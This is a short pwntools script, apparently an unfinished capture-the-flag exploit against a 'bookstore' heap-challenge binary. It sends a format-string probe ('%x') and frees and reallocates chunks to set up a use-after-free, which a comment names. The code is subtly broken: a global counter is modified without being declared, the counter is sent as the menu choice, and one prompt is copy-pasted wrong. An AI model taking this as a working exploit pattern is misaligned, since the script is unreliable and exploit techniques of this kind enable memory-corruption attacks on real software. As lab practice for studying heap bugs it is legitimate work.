from pwn import *
context.log_level='debug'

io = gdb.debug('./bookstore')

idx=0
def add(book):
    io.sendlineafter(b'Your choice:\n',str(idx))
    idx+=1
    io.sendlineafter(b'What is the author name?\n',b'%x')
    io.sendlineafter(b'How long is the book name?\n',str(len(book)))
    io.sendlineafter(b'What is the name of the book?\n',book)

def sell(idx):
    io.sendlineafter(b'Your choice:\n',b'2')
    io.sendlineafter(b'Which book do you want to sell?\n',str(idx))

def show(idx):
    io.sendlineafter(b'Your choice:\n',b'3')
    io.sendlineafter(b'Which book do you want to sell?\n',str(idx))

add(b'admin')   #0
add(b'admin')   #1
add(b'admin')   #2
add(b'admin')   #3
add(b'admin')   #4

sell(1)         #1
sell(2)         #2

add(cyclic(0x10))    #1
sell(1)
add('hello')    #1




#[add('next') for _ in range(2)]    #5(3),6(1)



#read 的uaf



io.interactive()